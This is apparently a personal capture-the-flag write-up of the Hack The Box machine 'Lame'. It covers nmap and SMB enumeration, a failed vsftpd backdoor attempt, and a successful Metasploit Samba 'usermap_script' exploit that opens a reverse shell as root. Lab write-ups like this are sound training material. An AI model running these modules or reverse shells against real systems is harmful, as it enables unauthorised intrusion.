# Lame 10.10.10.3 - Linux

__User__: 002 - Second Attempt

__Root__: 002 - Second Attempt

## 00 - Initial Attempt, 01/25/2020

`nmap -A 10.10.10.3`

```shell
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Attempted `smbclient -L 10.10.10.3 -p 445` as well as port `139`
  received: `protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED`


Possible CVE: https://www.samba.org/samba/security/CVE-2017-7494.html


Attempted: `enum4linux 10.10.10.3`

```shell
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 25 05:24:54 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.10.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
```

Attempted: `smbmap -H 10.10.10.3 -P 445 -v`

```shell
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.3...
[+] 10.10.10.3:445 is running Unix (name:LAME) (domain:LAME)
```

## 01 - Second Attempt, 05/04/2020

`nmap -Pn -A -T4 -p- 10.10.10.3`

```shell
thoth@kali:~/Projects/htb-notes/machines/Lame/dumps$ nmap -Pn -A -T4 -p- 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 21:58 EDT
Nmap scan report for 10.10.10.3
Host is up (0.030s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.53
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h03m33s, deviation: 2h49m43s, median: 3m32s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-05-04T22:04:14-04:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.97 seconds

```

#### Initial Notes

 - 21 running FTP with anon logins
  - "connected to 10.10.14.53" ?
  - vsFTPd 2.3.4
 - 22 ssh
  - OpenSSH 4.7p1
 - 139 smb
  - `Samba smbd 3.X - 4.X (workgroup: WORKGROUP)`
 - 445 smb
  - `Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)`
 - 3632 distccd?
  - `distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))`
  - This is a p2p network distributed C/C++ compiler

Logged in to `ftp 10.10.10.3` as `anonymous`, but the cupboards seem bare...

```shell
thoth@kali:~/Projects/htb-notes/machines/Lame$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:thoth): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
257 "/"
```

Attempting to place a file fails:

```shell
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
553 Could not create file.
```

There does appear to be a metasploit lead:

```shell
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

It fails.

```shell
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Performed an SMB version scan:

```shell
msf5 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.3:445        - Host could not be identified: Unix (Samba 3.0.20-Debian)
```

## Metasploit Success

Searched for the `3.0.20` version in MSF:

```shell
msf5 > search 3.0.20

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank       Check  Description
   -  ----                                                   ---------------  ----       -----  -----------
   0  auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
   1  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution


msf5 > use 1
msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.53:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo FKrQJOaETOA0KVVF;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "FKrQJOaETOA0KVVF\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.53:4444 -> 10.10.10.3:51941) at 2020-05-04 22:29:07 -0400

whoami
root
hostname
lame
```

Found user flag in `/home/makis/user.txt`

Root flag in `/root/root.txt`